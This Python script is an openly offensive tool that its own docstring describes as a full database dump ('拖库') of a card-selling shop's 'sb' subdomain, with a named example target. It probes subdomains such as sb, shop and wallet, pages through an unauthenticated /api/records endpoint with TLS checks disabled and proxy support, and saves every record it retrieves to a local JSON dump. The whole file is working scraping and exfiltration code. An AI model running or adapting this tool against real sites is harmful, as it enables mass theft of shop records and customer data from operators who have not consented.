#!/usr/bin/env python3
"""
异次元 sb 子域 /api/records 翻页全量拖库。

示例:
  python3 sb_records_dump.py -u https://sb.qq898.vip
  python3 sb_records_dump.py qq898.vip --discover
  python3 sb_records_dump.py -u https://sb.TARGET --max-pages 5000
"""
from __future__ import annotations

import argparse
import json
import time
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

import requests

from faka_common import DEFAULT_UA, ensure_out, json_or_text, log, resolve_proxy, save_hit

SB_PREFIXES = ("sb", "shop", "checker", "wallet", "order")


def discover_sb(domain: str, timeout: int, proxy: str) -> str:
    proxies = {"http": proxy, "https": proxy} if proxy else None
    for sub in SB_PREFIXES:
        url = f"https://{sub}.{domain}/api/stats/summary"
        try:
            r = requests.get(url, headers={"User-Agent": DEFAULT_UA}, timeout=timeout, proxies=proxies, verify=False)
            if r.status_code == 200:
                data = json_or_text(r)
                if isinstance(data, dict):
                    return f"https://{sub}.{domain}"
        except Exception:
            continue
    return ""


def fetch_page(base: str, page: int, timeout: int, proxy: str) -> Any:
    url = urljoin(base.rstrip("/") + "/", f"api/records?page={page}")
    proxies = {"http": proxy, "https": proxy} if proxy else None
    r = requests.get(url, headers={"User-Agent": DEFAULT_UA}, timeout=timeout, proxies=proxies, verify=False)
    return json_or_text(r)


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="sb 子域 records 翻页拖库")
    ap.add_argument("target", help="域名或 https://sb.xxx")
    ap.add_argument("--discover", action="store_true", help="从主域名发现 sb 子域")
    ap.add_argument("--max-pages", type=int, default=2000)
    ap.add_argument("--delay", type=float, default=0.2)
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--out", default="/data/tools/faka/out/sb_records.jsonl")
    ap.add_argument("--dump", default="/data/tools/faka/out/sb_records_all.json")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = resolve_proxy(args.proxy)

    if args.target.startswith("http"):
        base = args.target.rstrip("/")
        domain = base.split("//", 1)[-1].split("/")[0]
    else:
        domain = args.target
        base = discover_sb(domain, args.timeout, proxy) if args.discover else f"https://sb.{domain}"
        if not base and args.discover:
            base = discover_sb(domain, args.timeout, proxy)

    if not base:
        log(f"[!] 未发现 sb 子域: {domain}")
        return

    log(f"sb records dump {base} max_pages={args.max_pages}")
    all_rows: list[Any] = []
    empty_streak = 0

    for page in range(1, args.max_pages + 1):
        data = fetch_page(base, page, args.timeout, proxy)
        rows: list[Any] = []
        if isinstance(data, dict):
            rows = data.get("data") or data.get("records") or data.get("list") or []
        elif isinstance(data, list):
            rows = data

        if not rows:
            empty_streak += 1
            if empty_streak >= 3:
                log(f"连续空页，停止 page={page}")
                break
        else:
            empty_streak = 0
            all_rows.extend(rows)
            save_hit(Path(args.out), "sb_page", {"page": page, "count": len(rows), "sample": rows[0] if rows else None})
            if page % 50 == 0:
                log(f"  page={page} total={len(all_rows):,}")

        time.sleep(args.delay)

    dump = Path(args.dump)
    dump.parent.mkdir(parents=True, exist_ok=True)
    dump.write_text(json.dumps({"base": base, "total": len(all_rows), "records": all_rows}, ensure_ascii=False, indent=2), encoding="utf-8")
    log(f"完成 total={len(all_rows):,} -> {dump}")


if __name__ == "__main__":
    main()
